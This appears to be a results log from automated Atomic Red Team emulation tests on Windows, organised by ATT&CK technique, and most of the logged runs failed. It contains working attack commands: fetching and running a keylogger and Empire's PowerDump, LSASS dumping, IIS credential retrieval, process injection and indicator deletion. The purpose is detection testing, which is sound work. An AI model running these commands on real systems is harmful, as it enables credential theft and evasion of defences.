'T1070.006'}]",['windows'],['psh']
423,Fixed,defense-evasion,defense-evasion :: Indicator Removal on Host: File Deletion,defense-evasion :: ['Delete a single file - Windows PowerShell'],defense-evasion :: T1070.004,operation__atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c__SAVED_2024-03-07_073220,atomic_windows_depfalse_pshtrue__t1070_004__defense-evasion__indicator_removal_on_host-_file_deletion__04858322bc6cd08282f2ce96cab5ee7c,['04858322bc6cd08282f2ce96cab5ee7c'],1,0,0,[1],[''],"[""Remove-Item : Cannot find path 'C:\\Users\\puma-4\\AppData\\Local\\Temp\\deleteme_T1551.004' because it does not exist.At line:1 char:1+ Remove-Item -path $env:TEMP\\deleteme_T1551.004+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...eteme_T1551.004:String) [Remove-Item], ItemNotFoundEx    ception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand ""]",['1'],['Remove-Item -path $env:TEMP\\deleteme_T1551.004'],"['Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n']",['Delete a single file - Windows PowerShell'],"[{'tactic': 'defense-evasion', 'technique_name': 'Indicator Removal on Host: File Deletion', 'technique_id': 'T1070.004'}]",['windows'],['psh']
467,Fixed,multiple,multiple :: Input Capture: Keylogging,multiple :: ['Input Capture'],multiple :: T1056.001,operation__atomic_windows_depfalse_pshtrue__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b__SAVED_2024-03-07_024555,atomic_windows_depfalse_pshtrue__t1056_001__multiple__input_capture-_keylogging__a18a0e98b9566d92a1611a2da69b413b,['a18a0e98b9566d92a1611a2da69b413b'],1,0,0,[1],[''],"['& : The term \'\\T1056.001\\src\\Get-Keystrokes.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:398+ ... ps1""};  ;  &""$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"" - ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1056.001\\src\\Get-Keystrokes.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['if (Test-Path ""PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"") { ; } else {New-Item -ItemType Directory (Split-Path ""PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"") -Force | Out-Null; Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile ""PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1""};  ;  &""$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1"" -LogPath $env:TEMP\\key.log']","['Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n']",['Input Capture'],"[{'tactic': 'multiple', 'technique_name': 'Input Capture: Keylogging', 'technique_id': 'T1056.001'}]",['windows'],['psh']
468,Fixed,multiple,multiple :: Process Injection,multiple :: ['Dirty Vanity process Injection'],multiple :: T1055,operation__atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc__SAVED_2024-03-07_023921,atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__ce67d9c1b111032ddb8a56363c854fdc,['ce67d9c1b111032ddb8a56363c854fdc'],1,0,0,[1],[''],"['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:1+ Start-Process ""$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe"" (Sta ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']",['1'],"['Start-Process ""$PathToAtomicsFolder\\T1055\\bin\\x64\\redVanity.exe"" (Start-Process calc.exe -PassThru).Id']",['This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process\nwith shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at \nBlackHat Europe 2022. Shellcode will open a messsage box and a notepad.\n'],['Dirty Vanity process Injection'],"[{'tactic': 'multiple', 'technique_name': 'Process Injection', 'technique_id': 'T1055'}]",['windows'],['psh']
470,Fixed,multiple,multiple :: Process Injection,multiple :: ['Section View Injection'],multiple :: T1055,operation__atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514__SAVED_2024-03-07_022558,atomic_windows_depfalse_pshtrue__t1055__multiple__process_injection__4abdd4cce7c4aa8a3804a6f5ff365514,['4abdd4cce7c4aa8a3804a6f5ff365514'],1,0,0,[1],[''],"['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:45+ ...  -passthru; Start-Process ""$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectV ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']",['1'],"['$notepad = Start-Process notepad -passthru; Start-Process ""$PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe""']","['This test creates a section object in the local process followed by a local section view.\nThe shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view. \nA thread is then created in the target process, using the remote section view as start address.\n']",['Section View Injection'],"[{'tactic': 'multiple', 'technique_name': 'Process Injection', 'technique_id': 'T1055'}]",['windows'],['psh']
472,Fixed,multiple,multiple :: Process Injection: Process Hollowing,multiple :: ['Process Hollowing using PowerShell'],multiple :: T1055.012,operation__atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5__SAVED_2024-03-07_021924,atomic_windows_depfalse_pshtrue__t1055_012__multiple__process_injection-_process_hollowing__5fef676a9954938537bd1e2191d3e9b5,['5fef676a9954938537bd1e2191d3e9b5'],1,0,0,[1],[''],"['. : The term \'\\T1055.012\\src\\Start-Hollow.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:3+ . ""$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1""; $ppid=Get-Pr ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\T1055.012\\src\\Start-Hollow.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Start-Hollow : The term \'Start-Hollow\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:106+ ...  $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponso ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Start-Hollow:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['. ""$PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1""; $ppid=Get-Process explorer | select -expand id; Start-Hollow -Sponsor ""C:\\Windows\\System32\\notepad.exe"" -Hollow ""C:\\Windows\\System32\\cmd.exe"" -ParentPID $ppid -Verbose']",['This test uses PowerShell to create a Hollow from a PE on disk with explorer as the parent.\nCredit to FuzzySecurity (https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Start-Hollow.ps1)\n'],['Process Hollowing using PowerShell'],"[{'tactic': 'multiple', 'technique_name': 'Process Injection: Process Hollowing', 'technique_id': 'T1055.012'}]",['windows'],['psh']
474,Fixed,multiple,multiple :: Thread Execution Hijacking,multiple :: ['Thread Execution Hijacking'],multiple :: T1055.003,operation__atomic_windows_depfalse_pshtrue__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb__SAVED_2024-03-07_015932,atomic_windows_depfalse_pshtrue__t1055_003__multiple__thread_execution_hijacking__6a64ea6e29cdb83d468a27d6f69960cb,['6a64ea6e29cdb83d468a27d6f69960cb'],1,1,1,[0],[''],"['Start-Process : This command cannot be run due to the error: The system cannot find the file specified.At line:1 char:45+ ...  -passthru; Start-Process ""$PathToAtomicsFolder\\T1055.003\\bin\\InjectC ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand ']",['0'],"['$notepad = Start-Process notepad -passthru; Start-Process ""$PathToAtomicsFolder\\T1055.003\\bin\\InjectContext.exe""; Start-Sleep -Seconds 5; Stop-Process $notepad.id']","['This test injects a MessageBox shellcode generated by msfvenom in Notepad.exe using Thread Execution Hijacking. When successful, a message box will appear with the ""Atomic Red Team"" caption after one or two seconds. ']",['Thread Execution Hijacking'],"[{'tactic': 'multiple', 'technique_name': 'Thread Execution Hijacking', 'technique_id': 'T1055.003'}]",['windows'],['psh']
515,Fixed,defense-evasion,defense-evasion :: Obfuscated Files or Information: Compile After Delivery,defense-evasion :: ['Dynamic C# Compile'],defense-evasion :: T1027.004,operation__atomic_windows_depfalse_pshtrue__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91__SAVED_2024-03-06_211300,atomic_windows_depfalse_pshtrue__t1027_004__defense-evasion__obfuscated_files_or_information-_compile_after_delivery__55b2c04e70a5711957e264b04e645e91,['55b2c04e70a5711957e264b04e645e91'],1,1,1,[0],[''],"[""893687_T1027.004_DynamicCompile.exe : The term '893687_T1027.004_DynamicCompile.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ 893687_T1027.004_DynamicCompile.exe+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (893687_T1027.004_DynamicCompile.exe:String) [], CommandNotFoundExceptio    n    + FullyQualifiedErrorId : CommandNotFoundException ""]",['0'],"['Invoke-Expression ""893687_T1027.004_DynamicCompile.exe""']","[""When C# is compiled dynamically, a .cmdline file will be created as a part of the process. \nCertain processes are not typically observed compiling C# code, but can do so without touching disk. This can be used to unpack a payload for execution.\nThe exe file that will be executed is named as T1027.004_DynamicCompile.exe is contained in the 'bin' folder of this atomic, and the source code to the file is in the 'src' folder.\nUpon execution, the exe will print 'T1027.004 Dynamic Compile'.\n""]",['Dynamic C# Compile'],"[{'tactic': 'defense-evasion', 'technique_name': 'Obfuscated Files or Information: Compile After Delivery', 'technique_id': 'T1027.004'}]",['windows'],['psh']
534,Fixed,credential-access,credential-access :: OS Credential Dumping,credential-access :: ['Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)'],credential-access :: T1003,operation__atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__SAVED_2024-03-06_190012,atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88,['f6c693da77b8824b3c52ba3b6ca0bf88'],1,0,0,[1],[''],"[""C:\\Windows\\System32\\inetsrv\\appcmd.exe : The term 'C:\\Windows\\System32\\inetsrv\\appcmd.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*; C:\\Windows ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Windows\\System32\\inetsrv\\appcmd.exe:String) [], CommandNotFoundExcep    tion    + FullyQualifiedErrorId : CommandNotFoundException C:\\Windows\\System32\\inetsrv\\appcmd.exe : The term 'C:\\Windows\\System32\\inetsrv\\appcmd.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:60+ ... xe list apppool /@t:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list ap ...+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Windows\\System32\\inetsrv\\appcmd.exe:String) [], CommandNotFoundExcep    tion    + FullyQualifiedErrorId : CommandNotFoundException C:\\Windows\\System32\\inetsrv\\appcmd.exe : The term 'C:\\Windows\\System32\\inetsrv\\appcmd.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:122+ ... list apppool /@text:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list ap ...+                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Windows\\System32\\inetsrv\\appcmd.exe:String) [], CommandNotFoundExcep    tion    + FullyQualifiedErrorId : CommandNotFoundException ""]",['1'],['C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@t:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /@text:*; C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /text:*'],['AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)'],['Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping', 'technique_id': 'T1003'}]",['windows'],['psh']
538,Fixed,credential-access,credential-access :: OS Credential Dumping,credential-access :: ['Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)'],credential-access :: T1003,operation__atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__SAVED_2024-03-06_184658,atomic_windows_depfalse_pshtrue__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1,['2cc37a6cf2f1acdeaa6a6638016444d1'],1,0,0,[1],[''],"[""C:\\Windows\\System32\\inetsrv\\appcmd.exe : The term 'C:\\Windows\\System32\\inetsrv\\appcmd.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:1+ C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Windows\\System32\\inetsrv\\appcmd.exe:String) [], CommandNotFoundExcep    tion    + FullyQualifiedErrorId : CommandNotFoundException ""]",['1'],['C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config'],['AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes.\n[Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)'],['Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping', 'technique_id': 'T1003'}]",['windows'],['psh']
542,Fixed,credential-access,credential-access :: OS Credential Dumping: Security Account Manager,credential-access :: ['PowerDump Hashes and Usernames from Registry'],credential-access :: T1003.002,operation__atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__SAVED_2024-03-06_180704,atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212,['3bcfa369fd1f214e4d05944228eeb212'],1,0,0,[1],['STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON'],"['Import-Module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:533+ ... fore green; Import-Module ""PathToAtomicsFolder\\..\\ExternalPayloads\\Po ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\PowerDump.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand Invoke-PowerDump : The term \'Invoke-PowerDump\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:604+ ... hToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1""; Invoke-PowerDump+                                                          ~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Invoke-PowerDump:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']",['1'],"['if (Test-Path ""PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1"") { ; } else {New-Item -Type Directory ""PathToAtomicsFolder\\..\\ExternalPayloads\\"" -ErrorAction ignore -Force | Out-Null; Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1""};  ;  Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green; Import-Module ""PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1""; Invoke-PowerDump']",['Executes a hashdump by reading the hashes from the registry.'],['PowerDump Hashes and Usernames from Registry'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: Security Account Manager', 'technique_id': 'T1003.002'}]",['windows'],['psh']
549,Fixed,credential-access,credential-access :: OS Credential Dumping: LSASS Memory,credential-access :: ['Dump LSASS with createdump.exe from .Net v5'],credential-access :: T1003.001,operation__atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__SAVED_2024-03-06_174707,atomic_windows_depfalse_pshtrue__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1,['8e01631039faf6a9a84df376bf9ad0f1'],1,0,0,[1],[''],"['resolve-path : Cannot find path \'C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\' because it does not exist.At line:1 char:13+ $exePath =  resolve-path ""$env:ProgramFiles\\dotnet\\shared\\Microsoft.N ...+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Program File...oft.NETCore.App:String) [Resolve-Path], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.ResolvePathCommand The expression after \'&\' in a pipeline element produced an object that was not valid. It must result in a command name, a script block, or a CommandInfo object.At line:1 char:103+ ... shared\\Microsoft.NETCore.App\\5*\\createdump.exe""; & ""$exePath"" -u -f $ ...+                                                        ~~~~~~~~~~    + CategoryInfo          : InvalidOperation: (:String) [], RuntimeException    + FullyQualifiedErrorId : BadExpression ']",['1'],"['$exePath =  resolve-path ""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe""; & ""$exePath"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id']",['Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n'],['Dump LSASS with createdump.exe from .Net v5'],"[{'tactic': 'credential-access', 'technique_name': 'OS Credential Dumping: LSASS Memory', 'technique_id': 'T1003.001'}]",['windows'],['psh']
